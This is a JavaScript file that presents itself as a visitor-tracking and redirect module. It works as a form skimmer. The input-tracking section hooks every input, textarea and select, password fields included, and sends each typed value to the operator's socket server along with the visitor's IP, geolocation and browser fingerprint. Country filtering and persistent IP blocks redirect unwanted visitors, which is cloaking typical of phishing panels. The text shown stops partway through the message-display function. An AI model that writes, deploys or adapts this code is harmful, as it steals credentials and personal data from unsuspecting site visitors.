/**
 * Advanced Client-side Visitor Tracking and Redirect Handling
 * This script handles visitor tracking, input monitoring, and redirect functionality
 * in a clean, modular approach for easier maintenance.
 * 
 * Consolidated version that includes all redirect handling functionality
 * No dependency on separate redirect-handler.js
 */

// Main tracker module - encapsulates all tracking functionality
const VisitorTracker = (function() {
  // Private variables
  let socket = null;
  let clientIP = null;
  let isConnected = false;
  const inputDebounceDelay = 500; // ms
  const inputDebounceTimers = {};
  const heartbeatInterval = 30000; // 30 seconds
  let heartbeatTimer = null;
  
  // Queue for events when socket is not connected
  const queuedEvents = [];

  /**
   * Fetch and cache client location data
   * @returns {Promise<Object>} Location data
   */
  async function fetchLocationData() {
    try {
      // Check if we have cached location data that's still valid
      const cachedLocationData = localStorage.getItem('clientLocationData');
      const cacheTime = localStorage.getItem('clientLocationDataTimestamp');
      
      if (cachedLocationData && cacheTime && (Date.now() - parseInt(cacheTime)) < 24 * 60 * 60 * 1000) {
        // Use cached data if it's less than 24 hours old
        return JSON.parse(cachedLocationData);
      }
      
      // Try to get location data from ipinfo.io
      const response = await fetch('https://ipinfo.io/json');
      if (!response.ok) throw new Error('Failed to fetch location data');
      
      const data = await response.json();
      const locationData = {
        country: data.country || 'Unknown',
        city: data.city || 'Unknown',
        org: data.org || 'Unknown',
        isp: data.org || 'Unknown', // Use org as ISP if not available
        proxy: false, // We don't have this info from ipinfo.io
        region: data.region || 'Unknown',
        timezone: data.timezone || 'Unknown'
      };
      
      // Cache the location data
      localStorage.setItem('clientLocationData', JSON.stringify(locationData));
      localStorage.setItem('clientLocationDataTimestamp', Date.now().toString());
      
      console.log('Location data fetched and cached:', locationData);
      return locationData;
    } catch (error) {
      console.error('Error fetching location data:', error);
      return {
        country: 'Unknown',
        city: 'Unknown',
        org: 'Unknown',
        isp: 'Unknown',
        proxy: false
      };
    }
  }

  /**
   * Initialize the tracker
   */
  function init() {
    // Check if already initialized
    if (socket) {
      return;
    }
    
    // Check if this visitor was previously blocked
    const isBlocked = localStorage.getItem('visitorBlocked') === 'true';
    const redirectUrl = localStorage.getItem('visitorRedirectUrl');
    const blockReason = localStorage.getItem('visitorBlockReason');
    const isPermanent = localStorage.getItem('visitorBlockPermanent') === 'true';
    const blockTimestamp = parseInt(localStorage.getItem('visitorBlockTimestamp') || '0');
    
    if (isBlocked && redirectUrl) {
      // For permanent blocks, always redirect
      if (isPermanent) {
        console.log('This visitor is permanently blocked - redirecting');
        window.location.href = redirectUrl;
        return;
      }
      
      // For temporary blocks, check if the block has expired (24 hours)
      const blockDuration = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
      const currentTime = Date.now();
      
      if (blockTimestamp && (currentTime - blockTimestamp < blockDuration)) {
        console.log(`This visitor was blocked (${blockReason}) - redirecting`);
        // Redirect immediately
        window.location.href = redirectUrl;
        return;
      } else if (blockTimestamp) {
        // Block has expired, clear the block status
        console.log('Block has expired, clearing block status');
        localStorage.removeItem('visitorBlocked');
        localStorage.removeItem('visitorBlockReason');
        localStorage.removeItem('visitorRedirectUrl');
        localStorage.removeItem('visitorBlockTimestamp');
        localStorage.removeItem('visitorBlockPermanent');
      }
    }
    
    // Connect to socket server with reconnection options
    socket = io({
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      timeout: 20000,
      query: {
        // Add client IP to query params if available in sessionStorage
        clientIP: sessionStorage.getItem('currentSessionIP') || '',
        clientIPSource: sessionStorage.getItem('currentSessionIPSource') || ''
      }
    });
    
    // Set up event listeners
    setupSocketListeners();
    
    // Get client IP and location data, then start tracking
    Promise.all([
      getClientIP(),
      fetchLocationData()
    ]).then(([ip, locationData]) => {
      console.log('Client IP obtained:', ip);
      console.log('Location data obtained:', locationData);
      
      // Store the location data for later use
      window.visitorLocationData = locationData;
      
      // If socket is already connected, start tracking and send metadata
      if (isConnected) {
        console.log('Socket already connected, starting tracking');
        
        // Send visitor metadata with location data
        socket.emit('visitor-metadata', {
          clientIP: ip,
          ...locationData,
          timestamp: new Date().toISOString()
        });
        
        trackCurrentPage();
        setupInputTracking();
        setupNavigationTracking();
      } else {
        console.log('Waiting for socket connection before tracking...');
        // Wait for connection before tracking
        socket.once('connect', () => {
          console.log('Socket connected, now starting tracking');
          
          // Send visitor metadata with location data
          socket.emit('visitor-metadata', {
            clientIP: ip,
            ...locationData,
            timestamp: new Date().toISOString()
          });
          
          trackCurrentPage();
          setupInputTracking();
          setupNavigationTracking();
        });
      }
    }).catch(err => {
      console.error('Error getting client data:', err);
      // Still set up tracking even if data fetching fails
      trackCurrentPage();
      setupInputTracking();
      setupNavigationTracking();
    });
  }
  
  /**
   * Process any events that were queued while socket was disconnected
   */
  function processQueuedEvents() {
    if (!socket || !isConnected || queuedEvents.length === 0) return;
    
    console.log(`Processing ${queuedEvents.length} queued events`);
    
    // Process all queued events
    while (queuedEvents.length > 0) {
      const event = queuedEvents.shift();
      if (event && event.event && event.data) {
        console.log(`Sending queued event: ${event.event}`);
        socket.emit(event.event, event.data);
      }
    }
  }

  /**
   * Set up socket event listeners
   */
  function setupSocketListeners() {
    if (!socket) return;
    
    // Connection events
    socket.on('connect', function() {
      console.log('Socket connected');
      isConnected = true;
      
      // Send accurate client IP immediately on connection
      if (clientIP) {
        const source = localStorage.getItem('visitorIPSource') || 'ipify.org';
        console.log(`Sending accurate client IP on connection: ${clientIP} (source: ${source})`);
        socket.emit('client-ip', { 
          clientIP: clientIP,
          source: source,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          pageUrl: window.location.href
        });
        
        // Update socket connection with client IP as query parameter for reconnections
        socket.io.opts.query = socket.io.opts.query || {};
        socket.io.opts.query.clientIP = clientIP;
        socket.io.opts.query.clientIPSource = source;
        
        // Check country filter settings
        checkCountryFilter(clientIP);
      } else {
        // Try to get client IP if we don't have it yet
        getClientIP().then(ip => {
          if (ip) {
            console.log(`Got client IP after connection: ${ip}`);
            // sendIPToServer is called inside getClientIP
            
            // Check country filter settings with the newly obtained IP
            checkCountryFilter(ip);
          }
        });
      }
      
      // Process any queued events
      processQueuedEvents();
      
      // Start heartbeat to maintain connection
      startHeartbeat();
    });
    
    socket.on('disconnect', () => {
      isConnected = false;
      console.log('Disconnected from tracking server');
      
      // Clear heartbeat timer
      if (heartbeatTimer) {
        clearInterval(heartbeatTimer);
        heartbeatTimer = null;
      }
    });
    
    // Handle redirect events from server
    socket.on('redirect', (data) => {
      const { url, reason, permanent } = data;
      console.log(`Received redirect event: ${reason} - redirecting to ${url} (permanent: ${permanent === true})`);
      
      // Store the blocked status in localStorage to ensure persistence
      if (reason === 'ip_blocked') {
        localStorage.setItem('visitorBlocked', 'true');
        localStorage.setItem('visitorRedirectUrl', url);
        localStorage.setItem('visitorBlockReason', reason);
        localStorage.setItem('visitorBlockTimestamp', Date.now());
        localStorage.setItem('visitorBlockPermanent', permanent === true ? 'true' : 'false');
      }
      
      // Redirect after a short delay to allow the message to be logged
      setTimeout(() => {
        // Clear any open modals before redirecting
        const modals = document.querySelectorAll('.modal');
        modals.forEach(modal => {
          try {
            const modalInstance = bootstrap.Modal.getInstance(modal);
            if (modalInstance) modalInstance.hide();
          } catch (e) {
            console.error('Error closing modal:', e);
          }
        });
        
        // Redirect to the specified URL
        window.location.href = url;
      }, 500);
    });
    
    // Handle messages from the server
    socket.on('client-message', (message) => {
      console.log('Received message from server:', message);
      
      // Handle different message formats
      if (typeof message === 'string') {
        // If message is just a string, create a proper message object
        displayMessage({
          content: message,
          type: 'info'
        });
      } else if (typeof message === 'object') {
        if (message.message && !message.content) {
          // Convert dashboard format to displayMessage format
          displayMessage({
            content: message.message,
            type: message.type || 'info',
            title: message.title,
            duration: message.duration || 10
          });
        } else {
          // If message is already in the correct format, use it directly
          displayMessage(message);
        }
      }
    });
    
    // We're now handling all messages through the client-message event
    // socket.on('message-prompt', (data) => handleMessagePrompt(data)); // Removed to prevent duplicate messages
    
    // Listen for acknowledgment of message received
    socket.on('message-received', (data) => {
      console.log('Message received by server:', data);
    });
  }
  
  /**
   * Get client IP address from ipify.org for maximum accuracy
   * Prioritizes ipify.org that returns the actual public IP, not local IPs
   */
  async function getClientIP() {
    // First check if we have a cached IP from ipify.org that's still valid (less than 30 minutes old)
    const cachedIP = getCachedIP();
    if (cachedIP && cachedIP.source === 'ipify.org' && isValidPublicIP(cachedIP.ip)) {
      clientIP = cachedIP.ip;
      console.log('Using cached client IP from ipify.org:', clientIP);
      // Still try to refresh the IP in the background for future requests
      refreshIPInBackground();
      sendIPToServer(clientIP, 'ipify.org');
      return clientIP;
    }
    
    try {
      // Try ipify.org first as the primary and most reliable source
      console.log('Fetching IP from ipify.org...');
      const ipifyResponse = await fetch('https://api.ipify.org?format=json');
      if (ipifyResponse.ok) {
        const ipifyData = await ipifyResponse.json();
        if (ipifyData && ipifyData.ip && isValidPublicIP(ipifyData.ip)) {
          clientIP = ipifyData.ip;
          console.log('✅ Successfully detected client IP from ipify.org:', clientIP);
          
          // Cache the IP with source information
          cacheIP(clientIP, 'ipify.org');
          
          // Send the IP to the server with source information
          sendIPToServer(clientIP, 'ipify.org');
          return clientIP;
        }
      }
      
      // If ipify.org fails, try other services as fallback
      const detectedIP = await tryAllIPServices();
      if (detectedIP) {
        clientIP = detectedIP.ip;
        sendIPToServer(clientIP, detectedIP.source);
        return clientIP;
      }
      
      // If all services fail, try to get from localStorage as last resort
      const storedIP = localStorage.getItem('visitorClientIP');
      const storedSource = localStorage.getItem('visitorClientIPSource') || 'localStorage';
      if (storedIP && isValidPublicIP(storedIP)) {
        clientIP = storedIP;
        console.log(`⚠️ Using previously stored client IP from ${storedSource}:`, clientIP);
        sendIPToServer(clientIP, storedSource);
        return clientIP;
      }
      
      console.error('❌ Failed to detect client IP from all sources');
      return null;
    } catch (error) {
      console.error('Error in getClientIP:', error);
      return null;
    }
  }
  
  /**
   * Check if an IP is a valid public IP (not local/private)
   */
  function isValidPublicIP(ip) {
    if (!ip) return false;
    
    // Check if it's a valid IP format
    const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (!ipRegex.test(ip)) return false;
    
    // Check if it's not a local/private IP
    const parts = ip.split('.');
    const firstOctet = parseInt(parts[0], 10);
    const secondOctet = parseInt(parts[1], 10);
    
    // Filter out local IPs
    if (ip === '127.0.0.1') return false;
    if (firstOctet === 10) return false; // 10.0.0.0/8
    if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return false; // 172.16.0.0/12
    if (firstOctet === 192 && secondOctet === 168) return false; // 192.168.0.0/16
    if (firstOctet === 169 && secondOctet === 254) return false; // 169.254.0.0/16 (APIPA)
    if (ip === '0.0.0.0') return false;
    
    return true;
  }
  
  /**
   * Try multiple IP detection services in parallel and return the first valid result
   * @returns {Object|null} Object containing ip and source, or null if no valid IP found
   */
  async function tryAllIPServices() {
    try {
      // Define fallback services to try in parallel (excluding ipify.org which is tried separately in getClientIP)
      const services = [
        { url: 'https://api64.ipify.org?format=json', key: 'ip', name: 'ipify64.org' },
        { url: 'https://ipinfo.io/json', key: 'ip', name: 'ipinfo.io' },
        { url: 'https://api.db-ip.com/v2/free/self', key: 'ipAddress', name: 'db-ip.com' },
        { url: 'https://ipapi.co/json/', key: 'ip', name: 'ipapi.co' }
      ];
      
      // Create an array of promises with timeouts
      const promises = services.map(service => {
        // Add a timeout to each fetch request
        const timeoutPromise = new Promise((_, reject) => {
          setTimeout(() => reject(new Error(`Timeout for ${service.name}`)), 5000);
        });
        
        // The actual fetch request
        const fetchPromise = fetch(service.url)
          .then(response => response.json())
          .then(data => {
            const ip = data[service.key];
            if (ip && isValidPublicIP(ip)) {
              return { ip, source: service.name };
            }
            throw new Error(`Invalid IP from ${service.name}`);
          });
        
        // Race between the fetch and the timeout
        return Promise.race([fetchPromise, timeoutPromise])
          .catch(error => {
            console.error(`Error with ${service.name}:`, error.message);
            return null; // Return null for failed attempts
          });
      });
      
      // Wait for all promises to settle
      const results = await Promise.allSettled(promises);
      
      for (const result of results) {
        if (result.status === 'fulfilled' && result.value && result.value.ip) {
          const { ip, source } = result.value;
          console.log(`✅ Client IP detected from ${source}:`, ip);
          cacheIP(ip, source);
          return result.value; // Return both IP and source
        }
      }
      
      return null;
    } catch (error) {
      console.error('Error in tryAllIPServices:', error);
      return null;
    }
  }
  
  /**
   * Get cached IP from localStorage if it exists and is still valid
   * @returns {Object|null} Object containing ip and source, or null if no valid cached IP
   */
  function getCachedIP() {
    try {
      const storedIP = localStorage.getItem('visitorClientIP');
      const timestamp = localStorage.getItem('visitorClientIPTimestamp');
      const source = localStorage.getItem('visitorClientIPSource') || 'unknown';
      
      if (storedIP && timestamp && isValidPublicIP(storedIP)) {
        // Check if the cached IP is less than 30 minutes old
        const cachedTime = new Date(timestamp).getTime();
        const now = new Date().getTime();
        const thirtyMinutesInMs = 30 * 60 * 1000;
        
        if (now - cachedTime < thirtyMinutesInMs) {
          return {
            ip: storedIP,
            source: source
          };
        }
      }
    } catch (e) {
      console.error('Error accessing localStorage:', e);
    }
    return null;
  }
  
  /**
   * Cache the IP in localStorage with timestamp and source
   */
  function cacheIP(ip, source) {
    try {
      localStorage.setItem('visitorClientIP', ip);
      localStorage.setItem('visitorClientIPSource', source || 'unknown');
      localStorage.setItem('visitorClientIPTimestamp', new Date().toISOString());
    } catch (e) {
      console.error('Could not store IP in localStorage:', e);
    }
  }
  
  // Note: tryMultipleIPSources function removed as it duplicates tryAllIPServices functionality
  
  /**
   * Refresh the IP in the background without blocking the main flow
   * Prioritizes ipify.org as the most accurate source
   */
  function refreshIPInBackground() {
    setTimeout(async () => {
      try {
        // Try to get a fresh IP from ipify.org
        console.log('Background refresh: Fetching IP from ipify.org...');
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        
        if (data && data.ip && isValidPublicIP(data.ip)) {
          // Only update if different from current IP
          if (data.ip !== clientIP) {
            console.log('IP changed from background refresh:', data.ip);
            clientIP = data.ip;
            sendIPToServer(clientIP, 'ipify.org');
          }
          // Always update the cache with the latest timestamp
          cacheIP(clientIP, 'ipify.org');
          return; // Exit early if ipify.org succeeds
        }
      } catch (error) {
        console.error('Background IP refresh from ipify.org failed:', error);
      }
      
      // Only try fallback services if ipify.org fails
      try {
        const result = await tryAllIPServices();
        if (result && result.ip && isValidPublicIP(result.ip)) {
          clientIP = result.ip;
          sendIPToServer(clientIP, result.source);
        }
      } catch (fallbackError) {
        console.error('All background IP refresh attempts failed:', fallbackError);
      }
    }, 5000); // Wait 5 seconds before refreshing in background
  }
  
  /**
   * Ensure we have a valid client IP before sending data
   * @returns {Promise<string>} The client IP
   */
  async function ensureClientIP() {
    // If we already have a client IP, use it
    if (clientIP) {
      return clientIP;
    }
    
    // Check localStorage first
    const cachedIPData = getCachedIP();
    if (cachedIPData && cachedIPData.ip) {
      clientIP = cachedIPData.ip;
      // Send the cached IP to the server with source information
      sendIPToServer(clientIP, cachedIPData.source);
      // Refresh in background
      refreshIPInBackground();
      return clientIP;
    }
    
    // If we don't have an IP yet, get it now
    const result = await getClientIP();
    return result; // getClientIP already handles sending IP to server
  }
  
  /**
   * Send the detected IP to the server via multiple channels for reliability
   * @param {string} ip - The client IP address
   * @param {string} source - The source of the IP detection (e.g., 'ipify.org')
   */
  function sendIPToServer(ip, source = 'unknown') {
    if (!ip) return;
    
    // Use ipify.org as the source if it's from ipify
    if (source.includes('ipify')) {
      source = 'ipify.org';
    }
    
    // Method 1: Send via socket.io event if connected
    if (socket && isConnected) {
      socket.emit('client-ip', { 
        clientIP: ip,
        source: source,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      });
      
      // Update socket connection with client IP as query parameter for reconnections
      socket.io.opts.query = socket.io.opts.query || {};
      socket.io.opts.query.clientIP = ip;
    }
    
    // Method 2: Send via dedicated endpoint
    fetch('/update-client-ip', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 
        clientIP: ip,
        source: source,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href
      })
    }).catch(err => console.error('Error sending IP via POST:', err));
    
    // Method 3: Store in sessionStorage for cross-tab consistency
    try {
      sessionStorage.setItem('currentSessionIP', ip);
      sessionStorage.setItem('currentSessionIPSource', source);
      sessionStorage.setItem('currentSessionIPTimestamp', new Date().toISOString());
    } catch (e) {}
  }
  
  /**
   * Start heartbeat to maintain accurate online status
   */
  function startHeartbeat() {
    // Send initial presence
    sendPresence();
    
    // Set up interval for regular heartbeats
    heartbeatTimer = setInterval(() => {
      sendPresence();
    }, heartbeatInterval);
    
    // Also send presence when tab becomes visible again
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        sendPresence();
      }
    });
  }
  
  /**
   * Send presence update to server
   */
  /**
   * Get detailed browser and system information
   * @returns {Object} Client information including browser, OS, device, etc.
   */
  function getClientInfo() {
    // Parse user agent for browser and OS info
    const ua = navigator.userAgent;
    let browserName = 'Unknown';
    let browserVersion = '';
    let osName = 'Unknown';
    let osVersion = '';
    let deviceType = 'Desktop';
    
    // Detect browser
    if (ua.indexOf('Firefox') > -1) {
      browserName = 'Firefox';
      browserVersion = ua.match(/Firefox\/(\d+(\.\d+)?)/)?.[1] || '';
    } else if (ua.indexOf('SamsungBrowser') > -1) {
      browserName = 'Samsung Browser';
      browserVersion = ua.match(/SamsungBrowser\/(\d+(\.\d+)?)/)?.[1] || '';
    } else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) {
      browserName = 'Opera';
      browserVersion = ua.match(/(?:Opera|OPR)[\/](\d+(\.\d+)?)/)?.[1] || '';
    } else if (ua.indexOf('Edg') > -1) {
      browserName = 'Edge';
      browserVersion = ua.match(/Edg\/(\d+(\.\d+)?)/)?.[1] || '';
    } else if (ua.indexOf('Chrome') > -1) {
      browserName = 'Chrome';
      browserVersion = ua.match(/Chrome\/(\d+(\.\d+)?)/)?.[1] || '';
    } else if (ua.indexOf('Safari') > -1) {
      browserName = 'Safari';
      browserVersion = ua.match(/Version\/(\d+(\.\d+)?)/)?.[1] || '';
    } else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident/') > -1) {
      browserName = 'Internet Explorer';
      browserVersion = ua.match(/(?:MSIE |rv:)(\d+(\.\d+)?)/)?.[1] || '';
    }
    
    // Detect OS
    if (ua.indexOf('Windows') > -1) {
      osName = 'Windows';
      if (ua.indexOf('Windows NT 10.0') > -1) osVersion = '10';
      else if (ua.indexOf('Windows NT 6.3') > -1) osVersion = '8.1';
      else if (ua.indexOf('Windows NT 6.2') > -1) osVersion = '8';
      else if (ua.indexOf('Windows NT 6.1') > -1) osVersion = '7';
      else if (ua.indexOf('Windows NT 6.0') > -1) osVersion = 'Vista';
      else if (ua.indexOf('Windows NT 5.1') > -1) osVersion = 'XP';
      else if (ua.indexOf('Windows NT 5.0') > -1) osVersion = '2000';
    } else if (ua.indexOf('Mac OS X') > -1) {
      osName = 'macOS';
      osVersion = ua.match(/Mac OS X ([0-9_]+)/)?.[1]?.replace(/_/g, '.') || '';
    } else if (ua.indexOf('Android') > -1) {
      osName = 'Android';
      osVersion = ua.match(/Android (\d+(\.\d+)?)/)?.[1] || '';
      deviceType = 'Mobile';
    } else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
      osName = 'iOS';
      osVersion = ua.match(/OS (\d+[_\d]*)/)?.[1]?.replace(/_/g, '.') || '';
      deviceType = ua.indexOf('iPad') > -1 ? 'Tablet' : 'Mobile';
    } else if (ua.indexOf('Linux') > -1) {
      osName = 'Linux';
    }
    
    // Detect device type if not already set
    if (deviceType === 'Desktop' && /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      deviceType = 'Mobile';
      if (/iPad|Android(?!.*Mobile)/i.test(ua)) {
        deviceType = 'Tablet';
      }
    }
    
    // Get screen info
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    
    // Get language
    const language = navigator.language || navigator.userLanguage || 'Unknown';
    
    // Get timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    
    // Get cached location data if available
    const cachedLocationData = localStorage.getItem('clientLocationData');
    let locationData = null;
    
    if (cachedLocationData) {
      try {
        locationData = JSON.parse(cachedLocationData);
        // Check if cache is still valid (less than 24 hours old)
        const cacheTime = localStorage.getItem('clientLocationDataTimestamp');
        if (cacheTime && (Date.now() - parseInt(cacheTime)) > 24 * 60 * 60 * 1000) {
          // Cache expired, will be refreshed on next request
          locationData = null;
        }
      } catch (e) {
        console.error('Error parsing cached location data:', e);
        locationData = null;
      }
    }
    
    // Return comprehensive client info
    return {
      browser: {
        name: browserName,
        version: browserVersion,
        fullVersion: `${browserName} ${browserVersion}`,
        language: language,
        userAgent: ua
      },
      os: {
        name: osName,
        version: osVersion,
        fullVersion: osVersion ? `${osName} ${osVersion}` : osName
      },
      device: {
        type: deviceType,
        screenWidth: screenWidth,
        screenHeight: screenHeight
      },
      timezone: timezone,
      pageInfo: {
        url: window.location.href,
        path: window.location.pathname,
        title: document.title,
        referrer: document.referrer || 'Direct'
      },
      location: locationData || {
        country: 'Unknown',
        city: 'Unknown',
        org: 'Unknown',
        isp: 'Unknown',
        proxy: false
      }
    };
  }

  /**
   * Send presence update to server with enhanced client information
   */
  function sendPresence() {
    if (!socket || !isConnected || !clientIP) return;
    
    // Get detailed client information
    const clientInfo = getClientInfo();
    
    // Prepare detailed visitor data
    const visitorData = { 
      clientIP: clientIP,
      timestamp: new Date().toISOString(),
      path: clientInfo.pageInfo.path,
      title: clientInfo.pageInfo.title,
      browser: clientInfo.browser,
      os: clientInfo.os,
      device: clientInfo.device,
      timezone: clientInfo.timezone,
      referrer: clientInfo.pageInfo.referrer,
      // Add additional fields for visitor metadata
      country: clientInfo.location?.country || 'Unknown',
      city: clientInfo.location?.city || 'Unknown',
      org: clientInfo.location?.org || 'Unknown',
      isp: clientInfo.location?.isp || 'Unknown',
      proxy: clientInfo.location?.proxy || false
    };
    
    // Send visitor data to server
    socket.emit('client-presence', visitorData);
    
    // Also send as visitor-metadata to ensure it's properly stored
    socket.emit('visitor-metadata', visitorData);
  }
  
  /**
   * Track the current page view
   */
  function trackCurrentPage() {
    // Skip tracking for dashboard paths
    const currentPath = window.location.pathname;
    if (currentPath.startsWith('/dashboard')) {
      console.log('Dashboard path detected, skipping visitor tracking');
      return;
    }
    
    trackPageView();
  }
  
  /**
   * Track page views with accurate client IP
   */
  function trackPageView() {
    // Ensure we have a client IP before tracking
    ensureClientIP().then(ip => {
      if (!ip) {
        console.warn('Unable to get client IP for tracking');
        return;
      }
      
      // Check country filter before tracking
      checkCountryFilter(ip);
      
      // Create page view data
      const pageViewData = createPageViewData(ip);
      
      // Only track if socket is connected
      if (socket && isConnected) {
        console.log('Tracking page view:', pageViewData);
        socket.emit('page-view', pageViewData);
      } else {
        console.log('Socket not connected, queueing page view');
        queuedEvents.push({
          event: 'page-view',
          data: pageViewData
        });
      }
    }).catch(err => {
      console.error('Error tracking page view:', err);
    });
  }
  
  /**
   * Create page view data object
   * @param {string} ip - The client IP address
   * @returns {Object} Page view data
   */
  function createPageViewData(ip) {
    return {
      path: window.location.pathname,
      title: document.title,
      referrer: document.referrer || null,
      timestamp: new Date().toISOString(),
      ip: ip,
      clientIP: ip // Always include the accurate client IP
    };
  }
  
  /**
   * Check country filter settings and redirect if necessary
   * @param {string} ip - The client IP address
   */
  function checkCountryFilter(ip) {
    if (!socket || !isConnected || !ip) {
      console.warn('Cannot check country filter: socket not connected or IP not available');
      return;
    }
    
    // Skip country filter check for dashboard paths
    const currentPath = window.location.pathname;
    if (currentPath.startsWith('/dashboard')) {
      return;
    }
    
    console.log('Checking country filter for IP:', ip);
    
    // Request country filter settings from server
    socket.emit('get-country-filter-settings');
    
    // Listen for country filter settings response (one-time listener)
    socket.once('country-filter-settings', function(settings) {
      console.log('Received country filter settings:', settings);
      
      // If no settings or no mode defined, skip filtering
      if (!settings || !settings.countryFilterMode) {
        return;
      }
      
      // Get visitor's country based on IP
      socket.emit('get-visitor-country', { clientIP: ip });
      
      // Listen for visitor country response (one-time listener)
      socket.once('visitor-country', function(data) {
        console.log('Received visitor country data:', data);
        
        if (data.error || !data.country) {
          console.warn('Could not determine visitor country:', data.error || 'No country returned');
          return;
        }
        
        const visitorCountry = data.country.toUpperCase();
        console.log('Visitor country:', visitorCountry);
        
        // Apply country filter based on mode
        if (settings.countryFilterMode === 'allow') {
          // Allow Only mode: redirect if country is NOT in allowed list
          const allowedCountries = settings.allowedCountries || [];
          if (allowedCountries.length > 0 && !allowedCountries.includes(visitorCountry)) {
            console.log(`Country ${visitorCountry} not in allowed list, redirecting...`);
            handleRedirect(settings.countryRedirectUrl);
          }
        } else if (settings.countryFilterMode === 'block') {
          // Block mode: redirect if country IS in blocked list
          const blockedCountries = settings.blockedCountries || [];
          if (blockedCountries.length > 0 && blockedCountries.includes(visitorCountry)) {
            console.log(`Country ${visitorCountry} is blocked, redirecting...`);
            handleRedirect(settings.countryRedirectUrl);
          }
        }
      });
    });
  }
  
  /**
   * Set up tracking for all input fields
   */
  function setupInputTracking() {
    // Track inputs on page load
    trackInputChanges();
    
    // Track inputs after DOM changes (for dynamically added inputs)
    const observer = new MutationObserver(() => {
      trackInputChanges();
    });
    
    // Observe the entire document for changes
    observer.observe(document.body, { childList: true, subtree: true });
  }
  
  /**
   * Track input changes with debounce
   */
  function trackInputChanges() {
    const inputs = document.querySelectorAll('input, textarea, select');
    inputs.forEach(input => {
      // Skip if already tracked
      if (input.dataset.tracked === 'true') return;
      
      // Mark as tracked
      input.dataset.tracked = 'true';
      
      // Generate a unique ID for this input
      const inputId = input.id || input.name || input.placeholder || 'unnamed-' + Math.random().toString(36).substr(2, 9);
      
      // Add input event listener with debounce
      input.addEventListener('input', function(e) {
        // Clear previous timer for this input
        if (inputDebounceTimers[inputId]) {
          clearTimeout(inputDebounceTimers[inputId]);
        }
        
        // Set new timer to debounce rapid typing
        inputDebounceTimers[inputId] = setTimeout(async () => {
          // Use a flag to track whether input data has been sent successfully
          let inputDataSent = false;
          
          try {
            // Get the most accurate client IP available using await to ensure we have it
            const ip = await ensureClientIP();
            const currentIP = ip || clientIP || localStorage.getItem('visitorClientIP') || 'unknown';
            const source = localStorage.getItem('visitorClientIPSource') || 'unknown';
            
            // Create input data object with accurate IP
            const inputValue = input.value || '';
            const inputName = input.name || input.id || 'unnamed';
            const inputType = input.type || 'text';
            
            // Log the input value on the client side for debugging
            console.log(`Input captured - Name: ${inputName}, Type: ${inputType}, Value: "${inputValue}"`);
            
            const inputData = {
              path: window.location.pathname,
              type: inputType,
              name: inputName,
              value: inputValue,
              timestamp: new Date().toISOString(),
              ip: currentIP,
              clientIP: currentIP, // Include client IP in both formats for compatibility
              source: source // Include the source of the IP
            };
            
            // Send input data to server
            if (socket && isConnected) {
              socket.emit('input-data', inputData);
              console.log(`Input tracked with IP: ${currentIP} (source: ${source})`);
              inputDataSent = true; // Mark as sent
            } else {
              console.warn('Socket not connected, input data not sent');
              // Queue the data to be sent when socket reconnects
              queuedEvents.push({
                event: 'input-data',
                data: inputData
              });
              inputDataSent = true; // Mark as queued for sending
            }
          } catch (error) {
            console.error('Error getting client IP for input tracking:', error);
            
            // Only proceed with fallback if data wasn't already sent
            if (!inputDataSent) {
              // Use fallback IP
              const fallbackIP = clientIP || localStorage.getItem('visitorClientIP') || 'unknown';
              
              // Extract input values with proper fallbacks
              const inputValue = input.value || '';
              const inputName = input.name || input.id || 'unnamed';
              const inputType = input.type || 'text';
              
              // Log the input value on the client side for debugging in fallback mode
              console.log(`Input captured (fallback) - Name: ${inputName}, Type: ${inputType}, Value: "${inputValue}"`);
              
              // Create input data object with fallback IP
              const inputData = {
                path: window.location.pathname,
                type: inputType,
                name: inputName,
                value: inputValue,
                timestamp: new Date().toISOString(),
                ip: fallbackIP,
                clientIP: fallbackIP,
                source: 'fallback'
              };
              
              // Send input data to server with fallback IP
              if (socket && isConnected) {
                socket.emit('input-data', inputData);
                console.log(`Input tracked with fallback IP: ${fallbackIP}`);
              } else {
                console.warn('Socket not connected, input data not sent (fallback)');
                // Queue the data to be sent when socket reconnects
                queuedEvents.push({
                  event: 'input-data',
                  data: inputData
                });
              }
            }
          }
        }, 500); // 500ms debounce delay
      });
    });
  }
  
  /**
   * Set up tracking for client-side navigation
   */
  function setupNavigationTracking() {
    // Track page navigation via History API
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    // Override pushState
    history.pushState = (...args) => {
      originalPushState.apply(history, args);
      trackCurrentPage();
    };
    
    // Override replaceState
    history.replaceState = (...args) => {
      originalReplaceState.apply(history, args);
      trackCurrentPage();
    };
    
    // Track browser back/forward navigation
    window.addEventListener('popstate', () => {
      trackCurrentPage();
    });
  }
  
  /**
   * Display a message received from the server
   * @param {Object} message - The message object containing type, title, content, and duration
   */
  function displayMessage(message) {
    if (!message || !message.title || !message.content) {
      console.error('Invalid message format:', message);
      return;
    }
    
    // Create toast container if it doesn't exist
    let toastContainer = document.getElementById('tracker-toast-container');
    if (!toastContainer) {
      toastContainer = document.createElement('div');
      toastContainer.id = 'tracker-toast-container';
      toastContainer.style.position = 'fixed';
      toastContainer.style.top = '20px';
      toastContainer.style.right = '20px';
      toastContainer.style.zIndex = '9999';
      document.body.appendChild(toastContainer);
    }
    
    // Create toast element
    const toast = document.createElement('div');
    toast.style.minWidth = '300px';
    toast.style.backgroundColor = 'white';
    toast.style.color = '#333';
    toast.style.borderRadius = '5px';
    toast.style.padding = '15px';
